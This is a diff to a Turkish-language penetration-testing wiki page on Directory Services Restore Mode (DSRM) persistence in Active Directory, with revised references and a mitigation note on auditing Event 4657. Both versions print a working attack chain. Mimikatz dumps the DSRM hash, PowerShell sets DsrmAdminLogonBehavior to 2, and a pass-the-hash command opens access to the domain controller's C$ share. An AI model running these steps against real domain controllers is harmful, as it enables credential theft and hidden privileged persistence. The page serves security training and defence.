@@ -4,32 +4,37 @@
 
 ## Temel Bilgiler
 
-Her **DC** içerisinde bir **local administrator** hesabı bulunur. Bu makinede admin ayrıcalıklarına sahip olarak mimikatz kullanıp **local Administrator hash** değerini **dump** edebilirsiniz. Ardından bu parolayı **activate** etmek için bir registry değerini değiştirerek bu local Administrator kullanıcısına uzaktan erişebilirsiniz.\
-Öncelikle DC içerisindeki **local Administrator** kullanıcısının **hash** değerini **dump** etmemiz gerekiyor:
-```bash
+Her etki alanı denetleyicisinde bir Directory Services Restore Mode (DSRM) yönetici hesabı bulunur. Bu hesabın parolası, etki alanı denetleyicisinin yükseltilmesi sırasında ayarlanır ve Active Directory etki alanı hesaplarından ayrıdır.<sup>[[1]](#references)</sup>
+
+Bir etki alanı denetleyicisi üzerinde yönetici denetimine sahip bir saldırgan, yerel SAM veritabanını dump edebilir ve DSRM Administrator NTLM hash değerini kurtarabilir. Aşağıdaki Mimikatz komutu bu işlemi gerçekleştirir:<sup>[[2]](#references)</sup>
+```powershell
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
-Ardından bu hesabın çalışıp çalışmayacağını kontrol etmemiz gerekir; kayıt defteri anahtarının değeri "0" ise veya mevcut değilse, **"2" olarak ayarlamanız** gerekir:
-```bash
-Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
-New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
-Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
+Varsayılan olarak DSRM hesabı, geri yükleme modu için tasarlanmıştır. `DsrmAdminLogonBehavior` değerinin `2` olarak ayarlanması, bu yerel hesabın etki alanı denetleyicisi normal şekilde çalışırken kimlik doğrulaması yapmasına izin verir. Değeri değiştirmeden önce kontrol edin:<sup>[[2]](#references)[[3]](#references)</sup>
+```powershell
+$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
+$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue
+
+if ($null -eq $current) {
+New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
+} else {
+Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
+}
 ```
-Ardından, bir PTH kullanarak **C$ içeriğini listeleyebilir veya hatta bir shell elde edebilirsiniz**. Bu hash'i bellekte kullanarak (PTH için) yeni bir powershell oturumu oluştururken **kullanılan "domain" yalnızca DC makinesinin adıdır**:
-```bash
+Kurtarılan hash daha sonra yönetici `C$` paylaşımı gibi kaynaklara erişmek için bir pass-the-hash oturumunda kullanılabilir. Bu yerel hesap için `/domain` değeri olarak domain controller'ın bilgisayar adını kullanın:<sup>[[3]](#references)</sup>
+```powershell
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
-#And in new spawned powershell you now can access via NTLM the content of C$
+# In the new PowerShell process, access C$ over NTLM.
 ls \\dc-host-name\C$
 ```
-Bu konu hakkında daha fazla bilgi için: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) ve [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>
-
 ## Azaltma
 
-- Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` oluşturma/değiştirme denetimi
+- `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` üzerindeki değişiklikleri denetleyin. Anahtarın SACL'si **Set Value** işlemlerini denetleyecek şekilde yapılandırıldığında, 4657 güvenlik olayı bir kayıt defteri değerinin değiştirilmesini kaydeder.<sup>[[4]](#references)</sup>
 
-## Referanslar
+## References
 
-- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
-- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)
-
+- [1] [Microsoft: Directory Services Restore Mode yönetici parolasını sıfırlama](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
+- [2] [ADSecurity: Gizli Active Directory Persistence #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
+- [3] [ADSecurity: Gizli Active Directory Persistence #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
+- [4] [Microsoft: Olay 4657 — Bir kayıt defteri değeri değiştirildi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
 {{#include ../../banners/hacktricks-training.md}}
